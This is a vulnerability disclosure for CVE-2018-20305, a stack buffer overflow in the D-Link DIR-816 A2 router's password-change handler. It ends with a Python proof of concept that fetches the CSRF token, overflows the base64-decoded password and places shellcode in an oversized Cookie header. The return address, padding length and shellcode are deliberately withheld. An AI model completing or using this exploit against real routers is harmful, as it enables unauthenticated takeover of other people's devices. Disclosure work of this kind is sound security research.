# D-Link DIR-816 A2 Stack Overflow 
#### Vender & Firmware version ：D-Link 1.10 B05 
#### CVE-ID : CVE-2018-20305
#### Vendor Homepage : http://www.dlink.com.cn/
#### Hardware Link : http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-816 
![image](https://github.com/RootSoull/Vuln-Poc/blob/master/D-Link/DIR-816/DLINK.jpeg)
# Vulnerability Description
Stack-based buffer overflows found on d-link dir-816 A2 1.10 B05 devices allow arbitrary remote code execution without authentication.Embodied in the /goform/form2userconfig.cgi handler function, long password may lead to stack-based buffer overflow and cover the return address.
# Vulnerability Detail

In the route /goform/form2userconfig.cgi handler.The value of the parameter password is base64 decoded, and the result is stored on the stack.
The vendor only sets a password length limit on the front end, but does not check the password length for POST submission.

![image](https://github.com/RootSoull/Vuln-Poc/blob/master/D-Link/DIR-816/IDA.jpg)

There's no check on length of the password, and a very long input could lead to stack overflow and overwrite the return address:

![image](https://github.com/RootSoull/Vuln-Poc/blob/master/D-Link/DIR-816/GDB.jpg)

Fortunately, the heap is at fixed address with permission rwx. So we could build a very large HTTP header which contains the shellcode, and set the return address to that shellcode.

After running the poc, we easily get the shell.

![image](https://github.com/RootSoull/Vuln-Poc/blob/master/D-Link/DIR-816/GETSHELL.png)

# POC
More details, as the manufacturer did not fix, will not be disclosed here.
```python
#!/usr/bin/env python
# POC code reference: https://github.com/PAGalaxyLab/VulInfo/tree/master/D-Link/DIR-816/stack_overflow_1

from pwn import *
import requests

# First, we need the CSRF token
r=requests.get('http://192.168.0.1/dir_login.asp')
for l in r.content.split('\n'):
    if 'tokenid' in l:
        q2 = l.rfind('"')
        q1 = l[:q2].rfind('"')
        tokenid = l[q1+1:q2]
print 'tokenid is %s' % tokenid

# The return address will be overwritten as newRet 
newRet = '\x00\x00\x00\x00'

#More details, as the manufacturer did not fix, will not be disclosed here.
pBuf=''

pMy= "L"*xx+ newRet

rn = "\r\n"
padding = "\x00\x00\x00\x00"

pBuf= "username=A&oldpass=&newpass="+b64e(pMy)+"&confpass="+'&modify=B&select=s0&hiddenpass=&submit.htm=Send&tokenid=%s'% tokenid

payload = "POST /goform/form2userconfig.cgi " + "HTTP/1.1" + rn
payload += "Host: 192.168.0.1"+rn
payload += "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0" + rn
payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
payload += "Accept-Language: en-US,en;q=0.5" + rn
payload += "Accept-Encoding: gzip, deflate" + rn
payload += "Cookie: curShow=; ac_login_info=passwork; test=A" + padding*0x100 + shellcode + padding*0x4000 + rn
payload += "Connection: close" + rn
payload += "Upgrade-Insecure-Requests: 1" + rn
payload += ("Content-Length: %d" % len(pBuf)) +rn
payload += 'Content-Type: application/x-www-form-urlencoded'+rn
payload += rn
payload += pBuf

p = remote('192.168.0.1', 80)
p.send(payload)
print p.recv()
```
